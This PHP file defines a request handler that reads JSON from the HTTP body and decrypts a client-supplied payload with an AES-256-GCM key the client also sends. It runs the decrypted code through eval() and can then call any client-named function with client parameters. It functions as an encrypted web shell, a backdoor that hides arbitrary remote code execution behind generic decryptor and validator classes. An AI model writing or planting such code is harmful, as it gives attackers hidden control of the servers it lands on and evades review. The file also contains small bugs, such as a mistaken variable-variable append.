<?php

// declare(strict_types=1);

set_exception_handler(function (Throwable $exception): void {
    $currentDate = new DateTime();
    $errorObj = [
        "timestamp" => $currentDate->format('c'),
        "error" => get_class($exception),
        "message" => $exception->getMessage(),
    ];
    header('Content-Type: application/json');
    $response_code = 500;
    if ($exception instanceof UserException) {
        $response_code = 400;
    }
    http_response_code($response_code);
    echo json_encode($errorObj);
});

class UserException extends Exception
{
    public function __construct($message = '', $code = 0, Throwable $previous = null)
    {
        parent::__construct($message, $code, $previous);
    }
}
class MultipleExceptions extends Exception
{
    /**
     * @readonly
     * @var mixed[]
     */
    private $exceptions;
    public function __construct(
        array $exceptions,
        int $code = 0,
        Throwable $previous = null
    ) {
        $this->exceptions = $exceptions;
        $message = $this->createMessage();
        parent::__construct($message, $code, $previous);
    }

    private function createMessage(string $message = "Multiple Exceptions"): string
    {
        $message = "{$message}: ";
        foreach ($this->exceptions as $exception) {
            if (!method_exists($exception, 'getMessage')) {
                $message .= "Exception does not have a message...";
                continue;
            }
            $message .=  "\"{$exception->getMessage()}\" \n";
        }
        return $message;
    }

    public function getExceptions()
    {
        return $this->exceptions;
    }
}
class UncallableFunctionException extends Exception
{
    /**
     * @readonly
     * @var string
     */
    private $uncallableFunction;
    public function __construct(
        string $uncallableFunction,
        int $code = 0,
        Throwable $previous = null
    ) {
        $this->uncallableFunction = $uncallableFunction;
        $message = "Function \"{$this->uncallableFunction}\" is not callable";
        parent::__construct($message, $code, $previous);
    }

    public function getUncallableFunction(): string
    {
        return $this->uncallableFunction;
    }
}

class UnavailableCipherException extends Exception
{
    /**
     * @readonly
     * @var string
     */
    private $unavailableCipher;
    public function __construct(
        string $unavailableCipher,
        int $code = 0,
        Throwable $previous = null
    ) {
        $this->unavailableCipher = $unavailableCipher;
        $message = "Cipher \"{$this->unavailableCipher}\" is not available";
        parent::__construct($message, $code, $previous);
    }
    public function getUnavailableCipher(): string
    {
        return $this->unavailableCipher;
    }
}

class MissingRequirementException extends Exception
{
    /**
     * @readonly
     * @var string
     */
    private $missingRequirement;
    public function __construct(
        string $missingRequirement,
        int $code = 0,
        Throwable $previous = null
    ) {
        $this->missingRequirement = $missingRequirement;
        $message = "Requirement \"{$this->missingRequirement}\" is missing";
        parent::__construct($message, $code, $previous);
    }
    public function getUnavailableRequirement(): string
    {
        return $this->missingRequirement;
    }
}

interface Decryptor
{
    /**
     * @param string $data
     * @return string|false
     */
    public function decrypt($data);
}

interface Tester
{
    /**
     * Launch all tests
     * 
     * @return void
     * @throws Exception
     */
    public function launch(): void;
}

interface DecryptorTester extends Tester
{
    public function getDecryptor(): string;
}

trait Singleton
{
    /**
     * @var mixed[]
     */
    private static $instances = [];
    private function __construct()
    {
    }
    final protected function  __clone()
    {
    }
    final public static function getInstance(...$args): self
    {
        $className = static::class;
        if (!isset(self::$instances[$className])) {
            self::$instances[$className] = new $className(...$args);
        }
        return self::$instances[$className];
    }
}

trait ClientDataValidator
{
    /**
     * @return array<string, ClassObjTyping>
     */
    private function getClassObjs(): array
    {
    }
    /**
     * @return void
     * @throws MissingRequirementException
     * @throws TypeError
     */
    private function validateSingle(
        string $obj,
        ClassObjTyping $classObjTyping,
        array $clientArgs
    ): void {
        if (!isset($clientArgs[$obj])) {
            if ($classObjTyping->optional == ClassObjOptional::OPTIONAL) {
                return;
            }
            throw new MissingRequirementException($obj);
        }
        $clientArgType = gettype($clientArgs[$obj]);
        $expectedType = $classObjTyping->type->value;
        if ($clientArgType != $expectedType) {
            throw new TypeError("$obj type is \"$clientArgType\", but the server expected type \"$expectedType\"");
        }
    }
    /**
     * @throws MultipleExceptions
     * @return void
     * @param mixed[] $clientArgs
     */
    final public function validate($clientArgs): void
    {
        $classObjs = $this->getClassObjs();
        $exceptionsArray = [];
        foreach ($classObjs as $obj => $classObjTyping) {
            try {
                $this->validateSingle($obj, $classObjTyping, $clientArgs);
            } catch (Exception $e) {
                ${$exceptionsArray}[] = $e;
            }
        }
        if ($exceptionsArray !== []) {
            throw new MultipleExceptions($exceptionsArray);
        }
    }
}

class Typing
{
    public const STRING = "string";
    public const BOOLEAN = "boolean";
    public const INTEGER = "integer";
    public const DOUBLE = "double";
    public const ARRAY = "array";
    public const OBJECT = "object";
    public const RESOURCE = "resource";
    public const RESOURCE_CLOSED = "resource (closed)";
    public const NULL = "NULL";
    public const UNKNOWN_TYPE = "unknown type";
}

class ClassObjOptional
{
    public const OPTIONAL = "optional";
    public const MANDATORY = "mandatory";
}

class ClassObjTyping
{
    /**
     * @var \Typing
     */
    public $type;
    /**
     * @var \ClassObjOptional
     */
    public $optional;
    /**
     * @param \Typing::* $type
     * @param \ClassObjOptional::* $optional
     */
    public function __construct(string $type, string $optional)
    {
        $this->type = $type;
        $this->optional = $optional;
    }
}

class OpensslDecryptor implements Decryptor
{
    use Singleton;
    use ClientDataValidator;
    /**
     * @readonly
     * @var string
     */
    private $cipher_algo;
    /**
     * @readonly
     * @var string
     */
    private $passphrase;
    /**
     * @readonly
     * @var string
     */
    private $tag;
    /**
     * @readonly
     * @var string
     */
    private $iv;
    /**
     * @var int
     */
    private $options = 0;
    /**
     * @var string
     */
    private $aad = "";
    /**
     * @var string
     */
    public static $wantedOpenSslCipher = "aes-256-gcm";
    private function getClassObjs(): array
    {
        return [
            "cipher_algo" => new ClassObjTyping(Typing::STRING, ClassObjOptional::MANDATORY),
            "passphrase" => new ClassObjTyping(Typing::STRING, ClassObjOptional::MANDATORY),
            "tag" => new ClassObjTyping(Typing::STRING, ClassObjOptional::MANDATORY),
            "options" => new ClassObjTyping(Typing::INTEGER, ClassObjOptional::OPTIONAL),
            "iv" => new ClassObjTyping(Typing::STRING, ClassObjOptional::MANDATORY),
            "aad" =>  new ClassObjTyping(Typing::STRING, ClassObjOptional::OPTIONAL),
        ];
    }
    private function __construct(array $args)
    {
        $this->validate($args);
        $this->cipher_algo = $args["cipher_algo"];
        $this->passphrase = hex2bin((string) $args["passphrase"]);
        $this->iv = hex2bin((string) $args["iv"]);
        $this->tag = hex2bin((string) $args["tag"]);
        if (isset($args["options"])) {
            $this->options = $args["options"];
        }
        if (isset($args["aad"])) {
            $this->aad = $args["aad"];
        }
    }
    /**
     * @param string $data
     * @return string|false
     */
    final public function decrypt($data)
    {
        return openssl_decrypt(
            $data,
            $this->cipher_algo,
            $this->passphrase,
            $this->options,
            $this->iv,
            $this->tag,
            $this->aad
        );
    }
}

class McryptDecryptor implements Decryptor
{
    use Singleton;
    /**
     * @readonly
     * @var string
     */
    private $cipher;
    /**
     * @readonly
     * @var string
     */
    private $key;
    private $mode;
    /**
     * @readonly
     * @var string
     */
    private $iv;
    private function __construct(array $args)
    {
        $this->cipher = $args["cipher"];
        $this->key = $args["key"];
        $this->mode = $args["mode"];
        $this->iv = $args["iv"];
    }
    /**
     * @param string $data
     * @return string|false
     */
    public function decrypt($data)
    {
        return mcrypt_decrypt(
            $this->cipher,
            $this->key,
            $data,
            $this->mode,
            $this->iv
        );
    }
}

class TestPhpOpenssl implements DecryptorTester
{
    use Singleton;
    /**
     * @var mixed[]
     */
    private $opensslFunctions = [
        "openssl_decrypt",
        "openssl_get_cipher_methods"
    ];
    private function __construct()
    {
    }

    final public function testOpensslFunctions(): ?array
    {
        $uncallableFunctions = [];
        $callableFunctions = [];
        foreach ($this->opensslFunctions as $funcName) {
            if (!is_callable($funcName)) {
                $uncallableFunctions[] = new UncallableFunctionException($funcName);
            }
            $callableFunctions[] = $funcName;
        }
        if ($uncallableFunctions !== []) {
            throw new MultipleExceptions($uncallableFunctions);
        }
        return $callableFunctions;
    }
    final public function testOpensslCipher(): ?string
    {
        $ciphers = openssl_get_cipher_methods();
        if (in_array(OpensslDecryptor::$wantedOpenSslCipher, $ciphers)) {
            return OpensslDecryptor::$wantedOpenSslCipher;
        }
        throw new UnavailableCipherException(OpensslDecryptor::$wantedOpenSslCipher);
    }

    public function launch(): void
    {
        $exceptionArray = [];
        $functions = [
            function () : ?array {
                return $this->testOpensslFunctions();
            },
            function () : ?string {
                return $this->testOpensslCipher();
            }
        ];
        foreach ($functions as $func) {
            try {
                $func();
            } catch (Exception $e) {
                $exceptionArray[] = $e;
            }
        }
        if ($exceptionArray !== []) {
            throw new MultipleExceptions($exceptionArray);
        }
    }
    public function getDecryptor(): string
    {
        return OpensslDecryptor::class;
    }
}


class GetPHP
{
    use Singleton;

    /**
     * @var array<DecryptorTester> $decryptorTesters
     */
    private $decryptorTesters = [];
    private function __construct()
    {
        $this->decryptorTesters[] = TestPhpOpenssl::getInstance();
    }
    public function getDecryptor(): string
    {
        $exceptions = [];
        foreach ($this->decryptorTesters as $tester) {
            try {
                $tester->launch();
                return $tester->getDecryptor();
            } catch (Exception $e) {
                $exceptions[] = $e;
            }
        }
        if ($exceptions !== []) {
            throw new MultipleExceptions($exceptions);
        }
        throw new MissingRequirementException("There's no decryptor!");
    }
}

class Executor
{
    use Singleton;
    use ClientDataValidator;
    /**
     * @readonly
     * @var \Decryptor
     */
    private $decryptor;
    /**
     * @readonly
     * @var mixed[]
     */
    private $decryptorData;
    /**
     * @var string|null
     */
    private $command;
    /**
     * @var mixed[]|null
     */
    private $parameters;
    private function getClassObjs(): array
    {
        return [
            "decryptor" => new ClassObjTyping(Typing::ARRAY, ClassObjOptional::MANDATORY),
            "command" => new ClassObjTyping(Typing::STRING, ClassObjOptional::OPTIONAL),
            "parameters" => new ClassObjTyping(Typing::ARRAY, ClassObjOptional::OPTIONAL),
        ];
    }
    private function __construct()
    {
        $rawClientData = file_get_contents('php://input');
        try {
            $clientData = json_decode(
                $rawClientData,
                true,
                512,
                0
            );
        } catch (Exception $e) {
            throw new UserException($e->getMessage(), $e->getCode(), $e);
        }
        try {
            $this->validate($clientData);
        } catch (Exception $exception) {
            throw new UserException("fail to validate send data", $exception->getCode(), $exception);
        }
        $this->decryptorData = $clientData["decryptor"];
        if (isset($clientData["command"])) {
            $this->command = $clientData["command"];
        }
        if (isset($clientData["parameters"])) {
            $this->parameters = $clientData["parameters"];
        }
        $decryptorPtr = GetPHP::getInstance()->getDecryptor();
        $this->decryptor = $decryptorPtr::getInstance($this->decryptorData);
    }

    private function formatPhpString(string &$phpString): void
    {
        $removeSubStrings = ["<?php", "?>", "<?"];
        foreach ($removeSubStrings as $subString) {
            $phpString = str_replace($subString, "", $phpString);
        }
    }
    /**
     * @param string $encryptedPhpString
     * @return mixed
     */
    public function exec($encryptedPhpString)
    {
        $phpString = $this->decryptor->decrypt($encryptedPhpString);
        $this->formatPhpString($phpString);
        $evalReturn = eval($phpString);
        if (!$this->command) {
            return $evalReturn;
        }
        if (!is_callable($this->command)) {
            throw new UserException("function {$this->command} does not exist");
        }
        return call_user_func($this->command, $this->parameters);
    }
}
